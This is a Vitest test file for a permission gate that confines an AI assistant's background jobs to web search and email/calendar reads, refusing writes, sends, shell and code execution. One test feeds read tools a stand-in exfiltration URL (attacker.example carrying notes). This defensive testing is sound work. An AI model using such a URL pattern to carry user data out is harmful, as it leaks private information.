import { describe, expect, it, vi } from "vitest";

import { isReadOnlyTool } from "../../shared/outbound.ts";
import type { RuntimeEvent } from "../../shared/runtime-events.ts";
import { ACCOUNT_PARAM, CALENDARS_TOOL, GMAIL_MESSAGE_TOOL, GMAIL_PROFILE_TOOL, GMAIL_THREAD_TOOL } from "../assistant-sources.ts";
import {
  answerJobRequest,
  createAssistantJobGate,
  JOB_DECLINE,
  jobConnectorRefused,
  jobMayAllow,
  type AssistantJobGateDeps,
  type JobRequest,
} from "./assistant-job-requests.ts";
import { jobRoutineRunId } from "./assistant-turns.ts";
import type { RequestOutcome } from "../contracts.ts";

const request = (tool: string, more: Partial<JobRequest> = {}): JobRequest => ({ threadId: "job-1", requestType: "permission", tool, summary: `Use ${tool}`, turnId: "t1", ...more });

function harness(respondToRequest: () => Promise<RequestOutcome> = vi.fn(async (): Promise<RequestOutcome> => "allowed-once")) {
  const said: Array<{ name: string; ok: boolean }> = [];
  const logged: unknown[] = [];
  const release = vi.fn();
  const adapter = { respondToRequest: vi.fn(respondToRequest), interruptTurn: vi.fn(async () => {}) };
  const answer = (event: JobRequest, ids: { requestId?: string } = { requestId: "rq1" }) => answerJobRequest({
    event, requestId: ids.requestId, adapter, isCurrent: () => true, say: (message) => said.push(message.tool), log: (entry) => logged.push(entry), release,
  });
  return { said, logged, release, adapter, answer };
}

describe("JOB_DECLINE", () => {
  it("names only what every job turn can do, whatever its engine mounts", () => {
    expect(JOB_DECLINE).toBe("This background job can only search the web and read; this request was declined.");
  });
});

describe("jobMayAllow", () => {
  it("allows a web search and nothing else, and never answers a question", () => {
    expect(jobMayAllow(request("WebSearch"))).toBe(true);
    for (const tool of ["WebFetch", "Bash", "Write", "mcp__computer__screenshot", "mcp__browser__navigate", "AskUserQuestion"]) expect(jobMayAllow(request(tool)), tool).toBe(false);
    expect(jobMayAllow(request("WebSearch", { requestType: "question" }))).toBe(false);
    expect(jobMayAllow(request("WebSearch", { questions: [{ question: "Which one?" }] as unknown as JobRequest["questions"] }))).toBe(false);
  });

  it("never widens a sandbox, which only Full access may answer", () => {
    expect(jobMayAllow(request("WebSearch", { requiresExplicitApproval: true }))).toBe(false);
  });
});

describe("answerJobRequest", () => {
  it("allows a web search and declines anything else with a reason the turn reads, on the transcript and in the log", async () => {
    const h = harness();
    h.answer(request("WebSearch"));
    h.answer(request("Bash"));
    await vi.waitFor(() => expect(h.release).toHaveBeenCalledTimes(2));
    expect(h.adapter.respondToRequest).toHaveBeenNthCalledWith(1, "job-1", "rq1", { behavior: "allow" });
    expect(h.adapter.respondToRequest).toHaveBeenNthCalledWith(2, "job-1", "rq1", { behavior: "deny", message: JOB_DECLINE });
    expect(h.said).toEqual([{ name: "MausBot allowed: Use WebSearch", ok: true }, { name: "MausBot declined: Use Bash", ok: false }]);
    expect(h.logged).toEqual([{ decision: "auto-approved", tool: "WebSearch", summary: "Use WebSearch" }, { decision: "auto-denied", tool: "Bash", summary: "Use Bash" }]);
  });

  it("answers a question with the reason, since a question takes an answer and never a deny", async () => {
    const h = harness();
    h.answer(request("AskUserQuestion", { requestType: "question" }));
    await vi.waitFor(() => expect(h.release).toHaveBeenCalled());
    expect(h.adapter.respondToRequest).toHaveBeenCalledWith("job-1", "rq1", { behavior: "answer", message: JOB_DECLINE });
    expect(h.adapter.interruptTurn).not.toHaveBeenCalled();
  });

  it("stops the turn when nobody could take the answer", async () => {
    const h = harness(async () => "unavailable");
    h.answer(request("Bash"));
    await vi.waitFor(() => expect(h.release).toHaveBeenCalled());
    expect(h.adapter.interruptTurn).toHaveBeenCalledWith("job-1", "t1");
  });

  it("stops the turn when the answer cannot be delivered, since no card waits for a person", async () => {
    const h = harness(async () => { throw new Error("socket closed"); });
    h.answer(request("Bash"));
    await vi.waitFor(() => expect(h.adapter.interruptTurn).toHaveBeenCalledWith("job-1", "t1"));
    expect(h.release).toHaveBeenCalled();
  });

  it("stops the turn on a request it cannot answer by id, and allows nothing for it", async () => {
    const h = harness();
    h.answer(request("WebSearch"), {});
    await vi.waitFor(() => expect(h.release).toHaveBeenCalled());
    expect(h.adapter.interruptTurn).toHaveBeenCalledWith("job-1", "t1");
    expect(h.adapter.respondToRequest).not.toHaveBeenCalled();
    expect(h.said).toEqual([{ name: "MausBot declined: Use WebSearch", ok: false }]);
  });
});

describe("jobConnectorRefused", () => {
  const call = (name: unknown, args?: unknown) => ({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } });
  const multi = (...slugs: string[]) => call("COMPOSIO_MULTI_EXECUTE_TOOL", { tools: slugs.map((tool_slug) => ({ tool_slug, arguments: {} })) });

  it("passes protocol frames, tool discovery, and Gmail and Calendar reads", () => {
    for (const frame of [{ jsonrpc: "2.0", id: 1, method: "initialize", params: {} }, { jsonrpc: "2.0", id: 2, method: "tools/list" }, null, "text"]) {
      expect(jobConnectorRefused(frame), JSON.stringify(frame)).toBeNull();
    }
    for (const name of ["GMAIL_FETCH_EMAILS", "GMAIL_GET_ATTACHMENT", "GOOGLECALENDAR_EVENTS_LIST", "GOOGLECALENDAR_FIND_EVENT", "COMPOSIO_SEARCH_TOOLS", "COMPOSIO_GET_TOOL_SCHEMAS"]) {
      expect(jobConnectorRefused(call(name)), name).toBeNull();
    }
    expect(jobConnectorRefused(multi("GMAIL_FETCH_EMAILS", "GOOGLECALENDAR_EVENTS_LIST"))).toBeNull();
  });

  it("passes the profile, calendar list, message and thread reads from a job thread, with an account named", () => {
    for (const slug of [GMAIL_PROFILE_TOOL, CALENDARS_TOOL, GMAIL_MESSAGE_TOOL, GMAIL_THREAD_TOOL]) {
      expect(jobConnectorRefused({ method: "tools/call", params: { name: "COMPOSIO_MULTI_EXECUTE_TOOL", arguments: { tools: [{ tool_slug: slug, arguments: {}, [ACCOUNT_PARAM]: "ca_g1" }] } } }), slug).toBeNull();
    }
  });

  it("refuses every other app's tool, a read included, so no read can carry text to a URL", () => {
    for (const name of ["NOTION_GET_PAGE", "GOOGLEDRIVE_GET_FILE_METADATA", "FIRECRAWL_FETCH_URL"]) {
      expect(isReadOnlyTool(name), name).toBe(true);
      expect(jobConnectorRefused(call(name, { url: "https://attacker.example/?q=notes" })), name).toBe(name);
    }
    expect(jobConnectorRefused(multi("GMAIL_FETCH_EMAILS", "FIRECRAWL_FETCH_URL"))).toBe("FIRECRAWL_FETCH_URL");
    expect(jobConnectorRefused(call("gmail_fetch_emails"))).toBe("gmail_fetch_emails");
  });

  it("names the call that is not a read: sends, drafts, bookings, deletes, code and connecting an account", () => {
    for (const name of ["GMAIL_SEND_EMAIL", "GMAIL_CREATE_EMAIL_DRAFT", "GOOGLECALENDAR_CREATE_EVENT", "GMAIL_DELETE_MESSAGE", "GMAIL_MANAGE_CONNECTIONS"]) {
      expect(jobConnectorRefused(call(name, { to: "board@example.test" })), name).toBe(name);
    }
    expect(jobConnectorRefused(multi("GMAIL_FETCH_EMAILS", "GMAIL_SEND_EMAIL"))).toBe("GMAIL_SEND_EMAIL");
    expect(jobConnectorRefused(call("COMPOSIO_MULTI_EXECUTE_TOOL", { tools: [{ arguments: {} }] }))).toBe("COMPOSIO_PROXY_EXECUTE");
    expect(jobConnectorRefused(call("COMPOSIO_REMOTE_WORKBENCH", { code: "print(1)" }))).toBe("COMPOSIO_PROXY_EXECUTE");
    expect(jobConnectorRefused(call("COMPOSIO_MANAGE_CONNECTIONS", { toolkits: ["gmail"] }))).toBe("COMPOSIO_MANAGE_CONNECTIONS");
    expect(jobConnectorRefused(call("COMPOSIO_WAIT_FOR_CONNECTIONS"))).toBe("COMPOSIO_WAIT_FOR_CONNECTIONS");
    expect(jobConnectorRefused(call(undefined))).toBe("tools/call");
    expect(jobConnectorRefused({ jsonrpc: "2.0", id: 3, method: "tools/call" })).toBe("tools/call");
  });
});

describe("createAssistantJobGate", () => {
  type RequestOpened = Extract<RuntimeEvent, { type: "request.opened" }>;
  const mausbot = { id: "m", name: "MausBot", modelSelection: { instanceId: "claude" } };
  const opened = (threadId: string, tool: string, more: Partial<RequestOpened> = {}): RequestOpened => ({
    type: "request.opened", eventId: `e-${tool}`, provider: "claude", createdAt: "2026-10-18T09:00:00.000Z",
    threadId, turnId: "t1", requestId: "rq", requestType: "permission", tool, summary: `Use ${tool}`, ...more,
  });

  function gate(isStale = false) {
    const decided: unknown[] = [];
    const released: string[] = [];
    const said: unknown[] = [];
    const adapter = { respondToRequest: vi.fn(async () => "allowed-once" as const), interruptTurn: vi.fn(async () => {}) };
    const elsewhere = { respondToRequest: vi.fn(async () => "allowed-once" as const), interruptTurn: vi.fn(async () => {}) };
    const threads: Record<string, string | undefined> = { "job-1": jobRoutineRunId("abc"), main: undefined, routine: "run-7" };
    const stale = vi.fn(() => isStale);
    const deps: AssistantJobGateDeps = {
      routineRunId: (botId, threadId) => (botId === "m" ? threads[threadId] : undefined),
      adapter: (instanceId) => (instanceId === "claude" ? adapter : instanceId === "elsewhere" ? elsewhere : undefined),
      stale,
      decide: (row) => decided.push(row),
      release: (threadId) => released.push(threadId),
    };
    return { gate: createAssistantJobGate(deps), decided, released, said, adapter, elsewhere, stale, say: (message: unknown) => said.push(message) };
  }

  it("names a job thread by its routine run id", () => {
    const { gate: g } = gate();
    expect(g.isJobThread("m", "job-1")).toBe(true);
    expect(g.isJobThread("m", "main")).toBe(false);
    expect(g.isJobThread("m", "routine")).toBe(false);
    expect(g.isJobThread("other", "job-1")).toBe(false);
  });

  it("answers a request only in a job thread, on the engine that asked, and logs it as MausBot's", async () => {
    const h = gate();
    expect(h.gate.answers(opened("main", "Bash"), mausbot, h.say)).toBe(false);
    expect(h.gate.answers(opened("routine", "Bash"), mausbot, h.say)).toBe(false);
    expect(h.adapter.respondToRequest).not.toHaveBeenCalled();
    expect(h.gate.answers(opened("job-1", "Bash"), mausbot, h.say)).toBe(true);
    await vi.waitFor(() => expect(h.released).toEqual(["job-1"]));
    expect(h.adapter.respondToRequest).toHaveBeenCalledWith("job-1", "rq", { behavior: "deny", message: JOB_DECLINE });
    expect(h.said).toEqual([{ role: "bot", kind: "activity", tool: { name: "MausBot declined: Use Bash", ok: false } }]);
    expect(h.decided).toEqual([{ threadId: "job-1", requestId: "rq", botId: "m", botName: "MausBot", source: "routine", rule: "mausbot-job", decision: "auto-denied", tool: "Bash", summary: "Use Bash" }]);
  });

  it("answers on the instance that raised the request when it names one", async () => {
    const h = gate();
    expect(h.gate.answers(opened("job-1", "WebSearch", { providerInstanceId: "elsewhere" }), mausbot, h.say)).toBe(true);
    await vi.waitFor(() => expect(h.released).toEqual(["job-1"]));
    expect(h.elsewhere.respondToRequest).toHaveBeenCalledWith("job-1", "rq", { behavior: "allow" });
    expect(h.adapter.respondToRequest).not.toHaveBeenCalled();
  });

  it("leaves a stale request's turn and waiting state alone", async () => {
    const h = gate(true);
    h.adapter.respondToRequest.mockRejectedValueOnce(new Error("gone"));
    expect(h.gate.answers(opened("job-1", "Bash"), mausbot, h.say)).toBe(true);
    await vi.waitFor(() => expect(h.stale).toHaveBeenCalledTimes(2));
    expect(h.adapter.interruptTurn).not.toHaveBeenCalled();
    expect(h.released).toEqual([]);
  });

  it("lets a job turn reach only its reads among OpenMausBot's own routes, and refuses every write with a logged reason", () => {
    const h = gate();
    const refused = (method: string, path: string, threadId = "job-1") => h.gate.refusesRoute(mausbot, threadId, method, path);
    const reads = [
      ["GET", "/api/internal/session-search"],
      ["GET", "/api/internal/session-read"],
      ["GET", "/api/internal/tool-result"],
      ["POST", "/api/internal/tool-result"],
      ["POST", "/api/internal/hook"],
      ["POST", "/api/internal/connectors/mcp"],
    ];
    for (const [method, path] of reads) expect(refused(method!, path!), `${method} ${path}`).toBe(false);
    const writes = [
      ["POST", "/api/internal/memory"],
      ["POST", "/api/internal/memory/log"],
      ["POST", "/api/internal/options-card"],
      ["POST", "/api/internal/profile-requests"],
      ["POST", "/api/internal/model-requests"],
      ["POST", "/api/internal/routine-requests"],
      ["POST", "/api/internal/team-memory"],
      ["POST", "/api/internal/team-setup-requests"],
      ["POST", "/api/internal/bot-deletion-requests"],
      ["POST", "/api/internal/skills/stage"],
      ["POST", "/api/internal/escalate"],
      ["POST", "/api/internal/post-to-room"],
      ["POST", "/api/internal/coordinate-bots"],
      ["POST", "/api/internal/threads"],
      ["POST", "/api/internal/retry-thread"],
      ["POST", "/api/internal/create-bot"],
      ["POST", "/api/internal/create-room"],
      ["POST", "/api/internal/mcp-servers"],
      ["POST", "/api/internal/request-credential"],
      ["POST", "/api/internal/request-sign-in"],
      ["POST", "/api/internal/fill-login"],
      ["POST", "/api/internal/voice-note"],
      ["POST", "/api/internal/attach-file"],
      ["POST", "/api/internal/vm-exec"],
      ["POST", "/api/internal/connectors/request"],
      ["POST", "/api/internal/browser/mcp"],
      ["POST", "/api/internal/computer/mcp"],
      ["POST", "/api/internal/data/mcp"],
      ["POST", "/api/internal/highlevel/mcp"],
      ["POST", "/api/internal/phone/claim"],
      ["GET", "/api/internal/computer-control"],
      ["GET", "/api/internal/agents"],
      ["GET", "/api/internal/skills"],
      ["POST", "/api/internal/session-search"],
    ];
    for (const [method, path] of writes) expect(refused(method!, path!), `${method} ${path}`).toBe(true);
    expect(refused("POST", "/api/internal/memory", "main")).toBe(false);
    expect(refused("POST", "/api/internal/memory", "routine")).toBe(false);
    expect(h.decided).toHaveLength(writes.length);
    expect(h.decided[0]).toEqual({ threadId: "job-1", botId: "m", botName: "MausBot", tool: "POST /api/internal/memory", decision: "auto-denied", source: "routine", rule: "mausbot-job" });
  });

  it("refuses a connected-app write from a job thread and nowhere else, and passes its reads", () => {
    const h = gate();
    const frame = (name: string) => ({ jsonrpc: "2.0", id: 9, method: "tools/call", params: { name, arguments: {} } });
    expect(h.gate.refusesConnectorCall(mausbot, "job-1", frame("GMAIL_FETCH_EMAILS"))).toBe(false);
    expect(h.gate.refusesConnectorCall(mausbot, "job-1", { jsonrpc: "2.0", id: 1, method: "initialize", params: {} })).toBe(false);
    expect(h.gate.refusesConnectorCall(mausbot, "main", frame("GMAIL_SEND_EMAIL"))).toBe(false);
    expect(h.decided).toEqual([]);
    expect(h.gate.refusesConnectorCall(mausbot, "job-1", frame("GMAIL_SEND_EMAIL"))).toBe(true);
    expect(h.decided).toEqual([{ threadId: "job-1", botId: "m", botName: "MausBot", tool: "GMAIL_SEND_EMAIL", decision: "auto-denied", source: "routine", rule: "mausbot-job" }]);
  });
});
